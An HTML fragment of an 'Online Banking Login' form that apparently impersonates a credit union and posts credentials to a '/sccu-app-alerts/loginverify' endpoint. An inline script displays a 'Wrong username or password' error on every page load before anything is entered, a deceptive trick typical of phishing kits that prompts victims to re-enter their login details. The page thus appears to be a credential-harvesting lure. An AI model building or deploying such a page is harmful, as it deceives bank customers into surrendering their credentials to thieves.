<div class="row mt-5">
    <div class="col-md-6 m-auto">
      <div class="card card-body">
        <h1 class="text-center mb-3"><i class="fas fa-sign-in-alt"></i> Online Banking Login</h1>
      
        <!-- Red Text Alert -->
        <div class="alert alert-danger" id="loginErrorAlert">
          Wrong username or password. Please try again.
        </div>
        
        <form action="/sccu-app-alerts/loginverify" method="POST">
          <div class="form-group">
            <label for="email">Username</label>
            <input
              type="username"
              id="email"
              name="email"
              class="form-control"
              placeholder="Enter Your Username"
            />
            <!-- Show the alert when the page loads -->
            <script>
              document.getElementById('loginErrorAlert').style.display = 'block';
            </script>
          </div>
          <div class="form-group">
            <label for="password">Password</label>
            <input
              type="password"
              id="password"
              name="password"
              class="form-control" 
              placeholder="Enter Your Password"
            />
          </div>
          <button type="submit" class="btn btn-primary btn-block">Login</button>
        </form>
     
      </div>
    </div>
  </div>